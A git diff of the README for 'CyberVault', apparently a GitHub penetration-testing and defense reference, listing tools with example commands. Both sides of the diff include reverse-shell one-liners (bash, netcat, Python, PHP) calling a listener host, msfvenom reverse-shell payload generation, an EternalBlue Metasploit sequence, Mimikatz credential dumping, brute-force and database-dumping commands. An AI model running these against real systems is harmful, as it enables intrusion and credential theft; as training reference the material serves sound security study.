@@ -1,56 +1,60 @@
 # 🔐 CyberVault
 
-> A complete cybersecurity reference for recon, web testing, exploitation, privilege escalation, forensics, cloud security, and defense.
+> A full cybersecurity knowledge base for recon, web testing, exploitation, privilege escalation, reverse engineering, blue-team defense, cloud security, and CTF practice.
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](LICENSE)
 [![Status](https://img.shields.io/badge/Status-Active-success?style=for-the-badge)](https://github.com/markehospes-art/CyberVault)
-[![Repo Type](https://img.shields.io/badge/Type-Knowledge%20Base-orange?style=for-the-badge)](https://github.com/markehospes-art/CyberVault)
+[![Type](https://img.shields.io/badge/Type-Knowledge%20Base-orange?style=for-the-badge)](https://github.com/markehospes-art/CyberVault)
+[![Updated](https://img.shields.io/badge/Updated-October%202026-brightgreen?style=for-the-badge)]()
 
 ---
 
-## 🚨 Important Notice
+## 🚨 Legal & Ethical Notice
 
-This repository is for educational, defensive, and authorized security research only.
+CyberVault is intended for:
+- authorized security testing
+- legal lab environments
+- CTFs and training exercises
+- defensive hardening and system security review
+- educational study of cybersecurity tools and techniques
 
-Use it only in:
-- Your own lab environment
-- Authorized security engagements with written permission
-- CTFs and training platforms
-- Systems you own or explicitly maintain
-
-Do not use this material for unauthorized access, exploitation, or malicious activity.
-
----
-
-## 🧭 What This Repo Covers
-
-CyberVault is a structured guide for the most important cybersecurity tools and workflows, including:
-
-- Reconnaissance and OSINT
-- Network scanning and enumeration
-- Web application testing
-- SQL injection and API security
-- Exploit development and payload generation
-- Privilege escalation
-- Post-exploitation and persistence
-- Windows and Active Directory fundamentals
-- Linux hardening and user security
-- Defensive monitoring and incident response
-- Password attacks and credential security
-- Reverse engineering and malware analysis
-- Cloud security basics
+Do not use this repository to target systems, organizations, or networks without explicit authorization. Unauthorized activity may violate laws and professional ethics.
 
 ---
 
-## 🗂️ Repository Structure
+## 🧭 What CyberVault Is
+
+CyberVault is a curated cybersecurity reference designed to help people understand not just the tools, but also how and when to use them.
+
+It contains:
+- recon and OSINT workflows
+- network scanning and enumeration methods
+- web exploitation and API testing guides
+- privilege escalation checklists
+- post-exploitation and persistence methods
+- Windows Active Directory references
+- Linux and cloud hardening notes
+- defensive monitoring and incident response references
+- CTF and learning path resources
+
+This repo is meant to be practical and reference-driven, not just theoretical.
+
+---
+
+## 🗂️ Core Repository Structure
 
 ```text
 CyberVault/
 ├── README.md
 ├── TOOLS.md
+├── HOME.md
+├── INDEX.md
+├── QUICK-LINKS.md
+├── FAQ.md
 ├── LICENSE
-├── CONTRIBUTING.md
 ├── SECURITY.md
+├── CONTRIBUTING.md
+├── CODE_OF_CONDUCT.md
 ├── CheatSheets/
 │   ├── Nmap.md
 │   ├── Reverse-Shells.md
@@ -59,24 +63,32 @@ CyberVault/
 │   ├── Active-Directory-Quick-Ref.md
 │   ├── Burp-Suite.md
 │   ├── Metasploit.md
-│   ├── Pivoting-Port-Forwarding.md
-│   └── Home-Lab-Setup.md
+│   ├── Home-Lab-Setup.md
+│   ├── Command-Reference.md
+│   └── ...
 ├── Knowledge/
 │   ├── Networking/
 │   ├── Linux/
 │   ├── Web-Security/
+│   ├── Crypto/
 │   ├── Active-Directory/
 │   ├── Password-Attacks/
 │   ├── CTF/
 │   ├── Wireless/
-│   └── Cryptography/
+│   └── OSINT/
 ├── Scripts/
 │   ├── README.md
 │   ├── advanced-recon.md
 │   ├── exploitation-techniques.md
 │   ├── privilege-escalation.md
+│   ├── linux-privilege-escalation.md
+│   ├── windows-privilege-escalation.md
 │   ├── post-exploitation.md
 │   └── defensive-hardening.md
+├── MOCs/
+│   ├── Networking.md
+│   ├── Linux-Exploitation.md
+│   └── Active-Directory.md
 ├── .github/
 │   └── README.md
 └── .gitignore
@@ -84,93 +96,93 @@ CyberVault/
 
 ---
 
-## 🛠️ Core Tool Categories
+## 🧱 The Most Important Tool Categories
 
-### 1) Reconnaissance & Enumeration
-
-These tools help discover hosts, services, open ports, subdomains, and exposed assets.
-
+### 1) Reconnaissance & OSINT
 - Nmap
 - Masscan
-- Recon-ng
-- Subfinder
 - Amass
+- Subfinder
+- theHarvester
 - Shodan
-- TheHarvester
+- Recon-ng
 - Netcat
 - Wireshark
 - Zeek
 
 ### 2) Web Security Testing
-
 - Burp Suite
 - OWASP ZAP
-- Nikto
 - SQLMap
+- Nikto
+- Gobuster
 - Dirsearch
 - Feroxbuster
 - Wfuzz
-- Gobuster
+- ffuf
 
 ### 3) Exploitation & Payloads
-
 - Metasploit
 - Msfvenom
+- Searchsploit
 - Exploit-DB
 - PowerShell Empire
-- Veil Framework
-- Searchsploit
 - Sliver
+- Veil
 
-### 4) Post-Exploitation & Persistence
+### 4) Privilege Escalation
+- Linux PE tools: sudo, linpeas, pspy, GTFOBins
+- Windows PE tools: PowerUp, WinPEAS, Rubeus, Mimikatz
+- AD tools: BloodHound, SharpHound, PowerView
 
-- Mimikatz
+### 5) Post-Exploitation
 - BloodHound
+- Mimikatz
 - Rubeus
-- SharpHound
-- PowerView
 - Responder
 - Evil-WinRM
-- SSH tunneling and proxy tools
+- PowerView
+- Chisel
+- Plink
 
-### 5) Password & Credential Security
-
+### 6) Password & Credential Attacks
 - Hashcat
 - John the Ripper
 - Hydra
 - Medusa
 - CeWL
-- Opencart? (not relevant)
+- Hydra
 
-### 6) Reverse Engineering & Forensics
-
+### 7) Reverse Engineering & Forensics
 - Ghidra
 - Radare2
 - objdump
 - strings
 - binwalk
-- volatility
-- Wireshark
+- Volatility
 - Autopsy
+- Wireshark
 
-### 7) Defensive Security
-
-- Fail2ban
+### 8) Defensive Security
 - Suricata
 - Snort
-- OSSEC
+- Fail2ban
 - Wazuh
+- OSSEC
 - Auditd
 - YARA
 - ClamAV
 
 ---
 
-## 📘 Essential Tools and Commands
+## 🛠️ Tool-by-Tool Guide Summary
 
-Below is a practical reference of widely used tools and their common command patterns.
+The full tool catalog is maintained in [TOOLS.md](TOOLS.md). This README provides a practical overview.
 
-### Nmap
+### Reconnaissance Tools
+
+#### Nmap
+Purpose: port scanning, service discovery, OS detection.
 
 ```bash
 # Basic scan
@@ -179,7 +191,7 @@ nmap target.example.com
 # Scan specific ports
 nmap -p 22,80,443 target.example.com
 
-# Detect service versions
+# Detect versions
 nmap -sV target.example.com
 
 # OS detection
@@ -188,123 +200,96 @@ nmap -O target.example.com
 # Aggressive scan
 nmap -A target.example.com
 
-# UDP scan
-nmap -sU target.example.com
-
 # Full port scan
 nmap -p- target.example.com
 
 # Save output
 nmap -oN scan.txt target.example.com
 nmap -oX scan.xml target.example.com
-
-# Script scan
-nmap --script vuln target.example.com
 ```
 
-### Masscan
+#### Masscan
+Purpose: extremely fast internet-scale port scanning.
 
 ```bash
-# Extremely fast scan of common ports
-masscan 192.168.1.0/24 -p22,80,443 --rate=1000
-
-# Full port scan
-masscan 10.0.0.0/8 -p0-65535 --rate=10000
+masscan 10.0.0.0/8 -p22,80,443 --rate=10000
+masscan 192.168.1.0/24 -p0-65535 --rate=5000
 ```
 
-### Netcat
+#### Subfinder / Amass
+Purpose: subdomain discovery.
 
 ```bash
-# Basic TCP connect
-nc target.example.com 80
-
-# Port scan
-nc -zv target.example.com 22
-
-# Listen on a port
-nc -lvp 4444
-
-# Reverse shell
-nc attacker_ip 4444 -e /bin/bash
-
-# File transfer
-# On receiver
-nc -lvp 4444 > received.txt
-
-# On sender
-nc target.example.com 4444 < file.txt
+subfinder -d example.com
+amass enum -d example.com
 ```
 
-### Burp Suite
+#### TheHarvester
+Purpose: OSINT collection.
 
 ```bash
-# Start Burp Suite
+# Email/subdomain discovery
+theharvester -d example.com -b all
+
+# Save to file
+theharvester -d example.com -b google -f results.html
+```
+
+### Web Security Tools
+
+#### Burp Suite
+Purpose: intercept traffic and test web applications.
+
+```bash
 java -jar burpsuite_pro.jar
-
-# Common web testing flow:
-# 1. Set proxy to 127.0.0.1:8080
-# 2. Intercept requests
-# 3. Replay in Repeater
-# 4. Use Intruder for fuzzing
-# 5. Run scanner for issues
 ```
 
-### SQLMap
+Typical workflow:
+1. set browser proxy to 127.0.0.1:8080
+2. capture request
+3. replay in Repeater
+4. send to Intruder for fuzzing
+5. analyze server responses
+
+#### SQLMap
+Purpose: SQL injection testing automation.
 
 ```bash
-# Basic detection
 sqlmap -u "http://target.com/page.php?id=1"
-
-# Show DBs
 sqlmap -u "http://target.com/page.php?id=1" --dbs
-
-# Dump tables
 sqlmap -u "http://target.com/page.php?id=1" -D dbname --tables
-
-# Dump data
 sqlmap -u "http://target.com/page.php?id=1" -D dbname -T users --dump
-
-# POST data
-sqlmap -u "http://target.com/login" --data="user=admin&pass=pass"
 ```
 
-### Dirsearch / Gobuster
+#### Gobuster / Dirsearch / Feroxbuster
+Purpose: directory and file brute force.
 
 ```bash
-# Dirsearch
+gobuster dir -u http://target.com -w common.txt
 python3 dirsearch.py -u http://target.com -e php,html,txt
-
-# Gobuster directory enum
-gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-
-# Subdomain enum
-gobuster vhost -u http://site.com -w subdomains.txt
+feroxbuster -u http://target.com -w /usr/share/wordlists/dirb/common.txt
 ```
 
-### Metasploit
+### Exploit / Payload Tools
+
+#### Metasploit
+Purpose: framework for exploit development and payload delivery.
 
 ```bash
 msfconsole
-
-# Search modules
 search smb
-
-# Use module
 use exploit/windows/smb/ms17_010_eternalblue
-
-# Set options
 set RHOSTS 10.0.0.10
 set LHOST 10.0.0.5
 set LPORT 4444
-
-# Run exploit
 exploit
 ```
 
-### Msfvenom
+#### Msfvenom
+Purpose: generate payloads.
 
 ```bash
-# Windows reverse shell EXE
+# Windows executable reverse shell
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe > shell.exe
 
 # Linux ELF reverse shell
@@ -314,284 +299,204 @@ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf >
 msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw > shell.php
 ```
 
-### Hashcat
+### Password & Credential Tools
+
+#### Hashcat
+Purpose: high-speed password cracking.
 
 ```bash
-# Basic dictionary attack
-hashcat -m 1000 hash.txt wordlist.txt
-
-# MD5 attack
-hashcat -m 0 hash.txt wordlist.txt
-
-# Crack NTLM hashes
-hashcat -m 1000 -a 0 hashes.txt rockyou.txt
-
-# Show cracked hashes
+hashcat -m 1000 hashes.txt rockyou.txt
+hashcat -m 0 md5hashes.txt wordlist.txt
 hashcat --show -m 1000 hashes.txt
 ```
 
-### John the Ripper
+#### John the Ripper
+Purpose: flexible password cracking.
 
 ```bash
-# Wordlist attack
 john --wordlist=wordlist.txt hashes.txt
-
-# Show cracked results
 john --show hashes.txt
-
-# Dictionary + rules
 john --wordlist=wordlist.txt --rules hashes.txt
 ```
 
-### Hydra
+#### Hydra
+Purpose: online brute force against common services.
 
 ```bash
-# HTTP form login
-hydra -l admin -P passwords.txt target.example.com http-form-post "/login:username=^USER^&password=^PASS^&submit=Login:F=incorrect"
-
-# SSH brute force
+hydra -l admin -P passwords.txt target.example.com http-post-form "/login:username=^USER^&password=^PASS^:F=invalid"
 hydra -l root -P passwords.txt target.example.com ssh
 ```
 
-### TheHarvester
+### Privilege Escalation Tools
 
+#### Linux
 ```bash
-# Gather emails and subdomains
-theharvester -d example.com -b google,bing
-
-# Save results
-theharvester -d example.com -b all -f results.html
+sudo -l
+id
+uname -a
+find / -perm -4000 2>/dev/null
+getcap -r / 2>/dev/null
+cat /etc/crontab
+ls -la /etc/cron*
 ```
 
-### Subfinder / Amass
-
-```bash
-# Subfinder
-subfinder -d example.com
-
-# Amass enumeration
-amass enum -d example.com
+#### Windows
+```powershell
+whoami /priv
+systeminfo
+net localgroup administrators
+Get-ChildItem -Path C:\ -Recurse -Force
 ```
 
-### Wireshark / Tshark
+### Active Directory
 
+#### BloodHound
 ```bash
-# Capture traffic
-tshark -i eth0
-
-# Save pcap
-tshark -i eth0 -w capture.pcap
-
-# Read pcap
-tshark -r capture.pcap
-```
-
-### BloodHound
-
-```bash
-# Collect AD data
 SharpHound.exe --CollectionMethod All
-
-# Then load the JSON output in BloodHound GUI
+# Import JSON output into BloodHound GUI
 ```
 
-### Mimikatz
-
-```bash
-mimikatz.exe
-
-privilege::debug
-sekurlsa::logonpasswords
-lsadump::sam
+#### Rubeus
+```powershell
+Rubeus.exe kerberoast
+Rubeus.exe asreproast
 ```
 
-### Responder
+### Defense / Monitoring
 
+#### Suricata / Snort
 ```bash
-sudo responder -I eth0
+suricata -c /etc/suricata/suricata.yaml -i eth0
+snort -A console -q -c /etc/snort/snort.conf -i eth0
 ```
 
-### Ghidra / Radare2
-
+#### Auditd
 ```bash
-# Ghidra GUI is often used for reverse engineering
-# Radare2 basic use:
-r2 -A binary
-aaa
-pdf @ main
-```
-
-### OpenSSL
-
-```bash
-# Generate a private key
-openssl genrsa -out key.pem 2048
-
-# Generate self-signed cert
-openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 365
-
-# View certificate
-openssl x509 -in cert.pem -text -noout
+sudo auditctl -l
+sudo ausearch -k suspicious
 ```
 
 ---
 
-## 🔍 Practical Recon Workflow
+## 🔍 Practical Workflow
 
-A typical workflow looks like this:
+A realistic workflow for a target usually looks like this:
 
 ```bash
-# 1. Discover hosts
+# 1. Discover live hosts
 nmap -sn 10.10.10.0/24
 
-# 2. enumerate open ports
+# 2. Discover services and versions
 nmap -sS -sV -A 10.10.10.10
 
-# 3. identify web apps
+# 3. Enumerate web dirs and files
 gobuster dir -u http://10.10.10.10 -w common.txt
 
-# 4. find vulnerabilities
+# 4. Check for obvious vulnerabilities
 nikto -h http://10.10.10.10
 
-# 5. test application logic
+# 5. Test for SQLi and app logic issues
 sqlmap -u "http://10.10.10.10/login?id=1" --dbs
 
-# 6. escalate privileges
+# 6. Post-exploitation and privilege escalation
 sudo -l
 find / -perm -4000 2>/dev/null
 ```
 
 ---
 
-## 🧪 Common Payloads & One-Liners
+## 🧪 Quick Reference: Common Payloads and One-Liners
 
-### Reverse Shells
+### Reverse shell examples
 
 ```bash
-# Bash reverse shell
+# Bash
 bash -i >& /dev/tcp/10.0.0.5/4444 0>&1
 
-# Netcat reverse shell
+# Netcat
 nc -e /bin/sh 10.0.0.5 4444
 
-# Python reverse shell
-python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
+# Python
+python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("10.0.0.5",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/bash","-i"])'
 
-# PHP reverse shell
-php -r '$sock=fsockopen("10.0.0.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+# PHP
+php -r '$sock=fsockopen("10.0.0.5",4444); exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
-### File Enumeration
+### File and service enumeration
 
 ```bash
-# List files
 ls -la
-
-# Find SUID binaries
 find / -perm -4000 2>/dev/null
-
-# Find world-writable files
 find / -writable 2>/dev/null | head
-
-# Check scheduled jobs
 crontab -l
 ls -la /etc/cron*
 ```
 
-### Windows Enumeration
+### Windows enumeration
 
 ```powershell
-# System info
 systeminfo
-
-# Local users and groups
+whoami /priv
 net user
 net localgroup administrators
-
-# Privileges
-whoami /priv
-
-# Active Directory user listing
 Get-ADUser -Filter *
 ```
 
 ---
 
-## 🧠 Learning Paths
+## 🚀 Learning Paths
 
-### Beginner Path
-
+### Beginner
 ```text
-Networking Basics → Linux Fundamentals → Nmap → Web Security → Burp Suite → CTF Practice
+Networking → Linux → Web Security → CTF Practice → Defensive Security
 ```
 
-### Pentesting Path
-
+### Pentester
 ```text
 Recon → Enumeration → Exploitation → Privilege Escalation → Post-Exploitation → Reporting
 ```
 
-### Blue Team / Defense Path
-
+### Blue Team
 ```text
-Threat Modeling → Monitoring → SIEM → Linux/Windows Hardening → Incident Response → Forensics
+Threat Modeling → Monitoring → Logs → EDR → IR → Forensics → Hardening
 ```
 
-### Web Security Path
-
+### Web Security
 ```text
-HTTP/HTTPS → OWASP Top 10 → SQLi → XSS → CSRF → API Security → Bug Bounty
+HTTP/HTTPS → OWASP Top 10 → Burp → SQLi → XSS → API Testing → Bug Bounty
 ```
 
 ---
 
-## 📚 Recommended Resources
+## 📚 Recommended References
 
-- TryHackMe
-- Hack The Box
-- PortSwigger Academy
-- OWASP
-- GTFOBins
-- LOLBAS
-- PayloadsAllTheThings
-- MITRE ATT&CK
-- Attack Matrix for Enterprise
-
----
-
-## ⚖️ Ethical Use Policy
-
-This project is intended to support legal, authorized security education and defense. It is not a malicious toolkit.
-
-Stay within the law and the rules of your environment.
+- [OWASP](https://owasp.org)
+- [MITRE ATT&CK](https://attack.mitre.org)
+- [TryHackMe](https://tryhackme.com)
+- [Hack The Box](https://hackthebox.com)
+- [PortSwigger Academy](https://portswigger.net/web-security)
+- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
+- [GTFOBins](https://gtfobins.github.io)
+- [LOLBAS](https://lolbas-project.github.io)
 
 ---
 
-## 📝 Notes
+## 📑 Full Docs in This Repo
 
-This repo is meant to act as a living knowledge base. The goal is to keep improving it with:
-
-- New tool entries
-- Better explanations
-- More command examples
-- Updated references
-- Additional attack and defense flow diagrams
+- [HOME.md](HOME.md)
+- [INDEX.md](INDEX.md)
+- [QUICK-LINKS.md](QUICK-LINKS.md)
+- [TOOLS.md](TOOLS.md)
+- [FAQ.md](FAQ.md)
+- [Scripts/README.md](Scripts/README.md)
+- [CheatSheets/Command-Reference.md](CheatSheets/Command-Reference.md)
 
 ---
 
 ## 📄 License
 
-This repository is licensed under the MIT License. See [LICENSE](LICENSE) for details.
-
----
-
-## 🔗 Quick Links
-
-- [README](README.md)
-- [Tools Reference](TOOLS.md)
-- [Scripts Index](Scripts/README.md)
-- [Contributing](CONTRIBUTING.md)
-- [Security Policy](SECURITY.md)
+This project is licensed under the MIT License. See [LICENSE](LICENSE) for more information.
 
 ---
 
